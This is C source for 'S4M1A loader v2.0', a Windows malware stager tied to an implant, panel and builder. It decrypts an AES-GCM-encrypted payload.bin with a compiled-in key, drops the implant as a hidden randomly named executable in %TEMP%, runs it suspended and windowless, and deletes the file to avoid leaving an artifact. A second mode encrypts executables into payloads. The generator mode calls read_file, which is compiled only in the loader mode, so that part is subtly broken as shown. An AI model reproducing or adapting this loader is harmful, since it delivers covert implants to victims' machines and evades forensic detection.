/*
 * S4M1A loader v2.0 - stage-0 native loader
 *
 * Modes (selected by compile-time define):
 *   (default)  loader.exe      reads payload.bin beside it, decrypts
 *                              (AES-256-GCM, key compiled in), writes the
 *                              implant to %TEMP% as <random>.exe, spawns it
 *                              suspended, deletes the file, resumes. File
 *                              lives on disk only while the process image
 *                              section holds it -> no persistent artifact.
 *   MAKE_PAYLOAD genpayload.exe  encrypts a file to payload.bin:
 *                              genpayload.exe <in.exe> <key_hex_64> <out.bin>
 *
 * Blob layout (same convention as panel/config blobs):
 *   iv(12) || ciphertext || tag(16)     AES-256-GCM, key = 32 bytes
 *
 * Key = build_key from panel_secrets.json (same 32-byte KEK the builder
 * uses). Compile with: -DLOADER_KEY_HEX="<64 hex chars>"
 */
#define _WIN32_WINNT 0x0601
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if defined(_MSC_VER)
#pragma comment(lib, "bcrypt.lib")
#endif

#ifndef LOADER_KEY_HEX
#define LOADER_KEY_HEX "PASTE_64_HEX_BUILD_KEY_HERE"
#endif

/* ---------------------------------------------------------------- helpers */

static unsigned char g_key[32];

static int hexval(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static int hex2bin(const char *s, unsigned char *out, size_t max)
{
    size_t n = strlen(s);
    size_t i;
    if (n < 2 || n % 2) return -1;
    if (n / 2 > max) return -1;
    for (i = 0; i < n / 2; i++) {
        int hi = hexval(s[i * 2]);
        int lo = hexval(s[i * 2 + 1]);
        if (hi < 0 || lo < 0) return -1;
        out[i] = (unsigned char)((hi << 4) | lo);
    }
    return (int)(n / 2);
}

static void rand_bytes(unsigned char *b, size_t n)
{
    BCryptGenRandom(NULL, b, (ULONG)n, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
}

/* ---------------------------------------------------------------- GCM */

static int gcm_decrypt(const unsigned char *key, const unsigned char *iv,
                       const unsigned char *ct, size_t ctlen,
                       const unsigned char *tag, unsigned char *out)
{
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE hk = NULL;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    NTSTATUS st;
    ULONG done = 0;

    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
        return -1;
    if (BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAINING_MODE_GCM,
                          sizeof(BCRYPT_CHAINING_MODE_GCM), 0) != 0)
        goto fail;
    if (BCryptGenerateSymmetricKey(alg, &hk, NULL, 0,
                                   (PUCHAR)key, 32, 0) != 0)
        goto fail;

    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = (PUCHAR)iv;
    info.cbNonce = 12;
    info.pbTag = (PUCHAR)tag;
    info.cbTag = 16;

    st = BCryptDecrypt(hk, (PUCHAR)ct, (ULONG)ctlen, &info,
                       NULL, 0, (PUCHAR)out, (ULONG)ctlen, &done, 0);
    if (st != 0) goto fail;

    BCryptDestroyKey(hk);
    BCryptCloseAlgorithmProvider(alg, 0);
    return 0;

fail:
    if (hk) BCryptDestroyKey(hk);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    return -1;
}

static int gcm_encrypt(const unsigned char *key, const unsigned char *iv,
                       const unsigned char *pt, size_t ptlen,
                       unsigned char *ct, unsigned char *tag)
{
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE hk = NULL;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    NTSTATUS st;
    ULONG done = 0;

    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
        return -1;
    if (BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAINING_MODE_GCM,
                          sizeof(BCRYPT_CHAINING_MODE_GCM), 0) != 0)
        goto fail;
    if (BCryptGenerateSymmetricKey(alg, &hk, NULL, 0,
                                   (PUCHAR)key, 32, 0) != 0)
        goto fail;

    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = (PUCHAR)iv;
    info.cbNonce = 12;
    info.pbTag = tag;
    info.cbTag = 16;

    st = BCryptEncrypt(hk, (PUCHAR)pt, (ULONG)ptlen, &info,
                       NULL, 0, (PUCHAR)ct, (ULONG)ptlen, &done, 0);
    if (st != 0) goto fail;

    BCryptDestroyKey(hk);
    BCryptCloseAlgorithmProvider(alg, 0);
    return 0;

fail:
    if (hk) BCryptDestroyKey(hk);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    return -1;
}

/* ---------------------------------------------------------------- loader */

#if !defined(MAKE_PAYLOAD)

static unsigned char *read_file(const wchar_t *path, size_t *outlen)
{
    FILE *f = _wfopen(path, L"rb");
    unsigned char *buf;
    long sz;
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0) { fclose(f); return NULL; }
    buf = (unsigned char *)malloc((size_t)sz);
    if (!buf) { fclose(f); return NULL; }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
        free(buf); fclose(f); return NULL;
    }
    fclose(f);
    *outlen = (size_t)sz;
    return buf;
}

static void self_dir(wchar_t *out, size_t cap)
{
    GetModuleFileNameW(NULL, out, (DWORD)cap);
    wchar_t *slash = wcsrchr(out, L'\\');
    if (slash) slash[1] = L'\0';
    else wcscpy(out, L".\\");
}

static int spawn_hidden(const unsigned char *exe, size_t len)
{
    wchar_t tmp[MAX_PATH], path[MAX_PATH];
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    unsigned char rnd[8];
    wchar_t hex[17];
    HANDLE hf;
    DWORD written, i;

    GetTempPathW(MAX_PATH, tmp);
    rand_bytes(rnd, sizeof(rnd));
    for (i = 0; i < 8; i++)
        wsprintfW(hex + i * 2, L"%02x", rnd[i]);
    hex[16] = L'\0';
    wsprintfW(path, L"%s%s.exe", tmp, hex);

    hf = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                     FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hf == INVALID_HANDLE_VALUE) return -1;
    WriteFile(hf, exe, (DWORD)len, &written, NULL);
    CloseHandle(hf);

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    if (!CreateProcessW(NULL, path, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        DeleteFileW(path);
        return -1;
    }

    /* The process holds the image section -> deleting now leaves no file. */
    DeleteFileW(path);

    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -1;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}

int main(void)
{
    wchar_t dir[MAX_PATH], blobPath[MAX_PATH];
    unsigned char *blob;
    size_t blen;
    unsigned char *ct, *pt;
    size_t ctlen, ptlen;

    if (hex2bin(LOADER_KEY_HEX, g_key, sizeof(g_key)) != 32) return 1;

    self_dir(dir, MAX_PATH);
    wsprintfW(blobPath, L"%spayload.bin", dir);
    blob = read_file(blobPath, &blen);
    if (!blob) return 1;
    if (blen < 12 + 16 + 1) { free(blob); return 1; }

    ctlen = blen - 12 - 16;
    ct = blob + 12;                 /* skip iv */
    pt = (unsigned char *)malloc(ctlen);
    if (!pt) { free(blob); return 1; }

    if (gcm_decrypt(g_key, blob /*iv*/, ct, ctlen, blob + 12 + ctlen /*tag*/,
                    pt) != 0) {
        free(pt); free(blob);
        return 1;
    }
    ptlen = ctlen;

    spawn_hidden(pt, ptlen);

    SecureZeroMemory(pt, ptlen);
    free(pt);
    free(blob);
    SecureZeroMemory(g_key, sizeof(g_key));
    return 0;
}

#endif /* !MAKE_PAYLOAD */

/* ---------------------------------------------------------------- generator */

#if defined(MAKE_PAYLOAD)

int main(void)
{
    unsigned char *in;
    size_t inlen, olen;
    unsigned char iv[12], tag[16], *ct, *blob;
    FILE *f;
    char keyhex[129];
    size_t i;

    if (__argc < 4) {
        fprintf(stderr, "usage: genpayload.exe <in.exe> <key_hex_64> <out.bin>\n");
        return 1;
    }
    if (wcstombs(keyhex, __wargv[2], sizeof(keyhex)) == (size_t)-1)
        return 1;
    if (hex2bin(keyhex, g_key, sizeof(g_key)) != 32) {
        fprintf(stderr, "bad key\n");
        return 1;
    }

    in = read_file(__wargv[1], &inlen);
    if (!in) { fprintf(stderr, "cannot read input\n"); return 1; }

    ct = (unsigned char *)malloc(inlen ? inlen : 1);
    blob = (unsigned char *)malloc(inlen + 12 + 16);
    if (!ct || !blob) { free(in); return 1; }

    rand_bytes(iv, sizeof(iv));
    if (gcm_encrypt(g_key, iv, in, inlen, ct, tag) != 0) {
        fprintf(stderr, "encrypt failed\n");
        free(in); free(ct); free(blob);
        return 1;
    }

    memcpy(blob, iv, 12);
    memcpy(blob + 12, ct, inlen);
    memcpy(blob + 12 + inlen, tag, 16);
    olen = inlen + 12 + 16;

    f = _wfopen(__wargv[3], L"wb");
    if (!f) { fprintf(stderr, "cannot write output\n"); return 1; }
    fwrite(blob, 1, olen, f);
    fclose(f);

    for (i = 0; i < inlen; i++) in[i] = 0;
    free(in); free(ct); free(blob);
    fprintf(stderr, "wrote %s (%u bytes)\n",
            "payload.bin", (unsigned)olen);
    return 0;
}

#endif /* MAKE_PAYLOAD */